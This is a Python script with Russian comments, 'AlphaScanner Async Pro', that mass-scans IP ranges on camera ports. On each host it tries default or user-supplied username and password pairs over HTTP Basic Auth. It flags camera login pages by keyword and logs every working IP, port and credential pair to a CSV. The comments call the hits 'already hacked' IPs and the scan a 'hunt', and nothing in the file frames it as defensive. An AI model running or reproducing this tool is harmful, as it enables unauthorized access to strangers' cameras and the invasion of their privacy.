#!/usr/bin/env python3
"""
AlphaScanner Async Pro – асинхронный сканер камер с возобновлением.
Использование:
  python3 async_scanner_pro.py targets.txt [-t 500] [--timeout 3.0] [--resume old_results.csv]
"""
import asyncio, aiohttp, sys, os, ipaddress, time, argparse, re
from datetime import datetime
from tqdm import tqdm

# -------------------- НАСТРОЙКИ --------------------
PORTS = [80, 81, 82, 88, 554, 8000, 8001, 8080, 8081, 8085, 8088, 8181, 37777]
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest")
]
SIGS = [
    "easyn", "ipcamera", "webcam", "netcam", "snapshot.cgi", "videostream",
    "mjpeg", "camera", "dahua", "hikvision", "onvif", "rtsp", "ip cam",
    "WEB SERVICE", "login.asp", "DCS-", "alphapd", "xiongmai", "uniview"
]
DEFAULT_TIMEOUT = 3.0   # 3 секунды по умолчанию
DEFAULT_WORKERS = 500
# ---------------------------------------------------

found_lock = asyncio.Lock()
found_cameras = []
already_checked = set()   # IP, которые уже есть в предыдущих CSV

def load_resume_file(resume_file):
    """Загружает IP из предыдущего CSV, чтобы пропустить их."""
    if not resume_file or not os.path.exists(resume_file):
        return
    with open(resume_file, 'r') as f:
        for line in f:
            parts = line.strip().split(',')
            if len(parts) >= 1:
                ip = parts[0]
                already_checked.add(ip)

def iter_targets(filepath):
    """Генератор IP из файла (CIDR, start-end, одиночные)."""
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '/' in line and ':' not in line:
                try:
                    net = ipaddress.ip_network(line, strict=False)
                    for ip in net:
                        yield str(ip)
                except:
                    pass
            elif '-' in line and ':' not in line:
                parts = line.split('-')
                if len(parts) == 2:
                    a, b = parts[0].strip(), parts[1].strip()
                    try:
                        start = int(ipaddress.IPv4Address(a))
                        end = int(ipaddress.IPv4Address(b))
                        while start <= end:
                            yield str(ipaddress.IPv4Address(start))
                            start += 1
                    except:
                        pass
            else:
                yield line

def is_camera(text):
    tlow = text.lower()
    return any(sig in tlow for sig in SIGS)

async def scan_ip(session, ip, output_file, timeout, semaphore, creds):
    """Асинхронно проверяет один IP на всех портах и кредах."""
    async with semaphore:
        # Пропускаем уже взломанные IP
        if ip in already_checked:
            return None
        for port in PORTS:
            for user, pwd in creds:
                try:
                    url = f"http://{ip}:{port}"
                    auth = aiohttp.BasicAuth(user, pwd)
                    async with session.get(url, auth=auth, timeout=timeout, ssl=False) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if is_camera(text):
                                async with found_lock:
                                    if ip not in already_checked:  # двойная проверка
                                        already_checked.add(ip)
                                        found_cameras.append((ip, port, user, pwd))
                                        with open(output_file, 'a', encoding='utf-8') as f:
                                            f.write(f"{ip},{port},{user},{pwd}\n")
                                return (ip, port, user, pwd)
                except:
                    pass
    return None

async def main():
    parser = argparse.ArgumentParser(description='AlphaScanner Async Pro')
    parser.add_argument('targets', help='Файл с диапазонами IP')
    parser.add_argument('-t', '--workers', type=int, default=DEFAULT_WORKERS, help='Число одновременных соединений')
    parser.add_argument('--timeout', type=float, default=DEFAULT_TIMEOUT, help='Таймаут запроса (сек)')
    parser.add_argument('--resume', type=str, default='', help='Предыдущий CSV для пропуска уже найденных IP')
    parser.add_argument('--creds', type=str, default='', help='Файл с логинами:паролями (по одному на строку)')
    args = parser.parse_args()

    if not os.path.exists(args.targets):
        print(f"[-] Файл {args.targets} не найден")
        sys.exit(1)

    # Загружаем кастомные креды, если даны
    creds = DEFAULT_CREDS
    if args.creds and os.path.exists(args.creds):
        creds = []
        with open(args.creds, 'r') as f:
            for line in f:
                if ':' in line:
                    u, p = line.strip().split(':', 1)
                    creds.append((u, p))

    # Загружаем предыдущий прогресс
    load_resume_file(args.resume)

    out_file = f"async_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(out_file, 'w', encoding='utf-8') as f:
        f.write("IP,Port,Username,Password\n")

    # Оценка количества IP для прогресс-бара
    total_lines = sum(1 for line in open(args.targets) if line.strip() and not line.startswith('#'))
    estimated = total_lines * 256
    pbar = tqdm(total=estimated, desc="Охота", unit="ip", ncols=80)

    semaphore = asyncio.Semaphore(args.workers)
    connector = aiohttp.TCPConnector(limit=args.workers, limit_per_host=5, force_close=True)
    timeout = aiohttp.ClientTimeout(total=args.timeout)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for ip in iter_targets(args.targets):
            task = asyncio.ensure_future(scan_ip(session, ip, out_file, args.timeout, semaphore, creds))
            tasks.append(task)

            if len(tasks) >= args.workers * 2:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for t in done:
                    res = await t
                    if res:
                        tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
                    pbar.update(1)
                tasks = list(pending)

        for future in asyncio.as_completed(tasks):
            res = await future
            if res:
                tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
            pbar.update(1)

    pbar.close()
    print(f"\n[+] Готово! Найдено новых камер: {len(found_cameras)}")
    print(f"[+] Результаты сохранены в {out_file}")

if __name__ == "__main__":
    # Попытка использовать uvloop для ускорения (Linux)
    try:
        import uvloop
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    except:
        pass
    asyncio.run(main())